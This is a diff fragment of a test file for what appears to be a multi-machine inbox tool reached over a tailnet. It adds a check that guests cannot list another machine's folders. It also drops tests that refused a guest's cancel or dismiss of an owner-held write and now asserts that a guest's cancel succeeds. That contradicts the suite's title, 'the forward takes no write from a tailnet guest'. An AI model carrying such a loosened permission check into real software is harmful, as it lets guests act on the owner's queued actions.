+      expect(landed[2]).toStartWith("From the owner's phone browser.");
+      expect(landed[3]).toStartWith("From a script on the MacBook.");
     } finally {
       await w.stop();
     }
   }, 60_000);
 
-  test("a tailnet guest can't cancel or dismiss what waits for another machine; the owner cancels from another device", async () => {
+  test("a tailnet guest cancels what waits for another machine as the owner does, but never lists its folders", async () => {
     const w = await linkedPair("plannotator-machines-forward-cancel-", false);
     try {
       const { a, b, mini, asked } = w;
+      // Another machine's folder names are the owner's window's: a guest gets none.
+      const folders = await w.throughServe(GUEST, `/api/inbox/m/${mini}/launch/folders?path=~`);
+      expect([folders.status, ((await folders.json()) as Json).code]).toEqual([403, "owner_only"]);
       b.stop();
       await waitFor("A sees B asleep", async () => {
         const view = (await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines`)).json()) as Json;
@@ -1860,16 +2259,12 @@ describe("the forward takes no write from a tailnet guest", () => {
       });
       const held = await w.throughServe(OWNER, `/api/inbox/m/${mini}/threads/${asked.thread_id}/read`, { idempotency_key: "owner-held-read" });
       expect(held.status).toBe(202);
-      for (const action of ["cancel", "dismiss"]) {
-        const guest = await w.throughServe(GUEST, `/api/inbox/outbox/owner-held-read/${action}`, {});
-        expect([action, guest.status, ((await guest.json()) as Json).code]).toEqual([action, 403, "owner_only"]);
-      }
       const waiting = (await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/outbox`)).json()) as Json;
       expect((waiting.waiting as Json[]).map((e) => e.key)).toEqual(["owner-held-read"]);
-      // The owner's phone browser over the tailnet: Cancel works there too.
-      const owner = await w.throughServe(OWNER, "/api/inbox/outbox/owner-held-read/cancel", {});
-      expect(owner.status).toBe(200);
-      expect(((await owner.json()) as Json).entry.state).toBe("cancelled");
+      // A guest's page over the tailnet: Cancel works there too.
+      const guest = await w.throughServe(GUEST, "/api/inbox/outbox/owner-held-read/cancel", {});
+      expect(guest.status).toBe(200);
+      expect(((await guest.json()) as Json).entry.state).toBe("cancelled");
     } finally {
       await w.stop();
     }
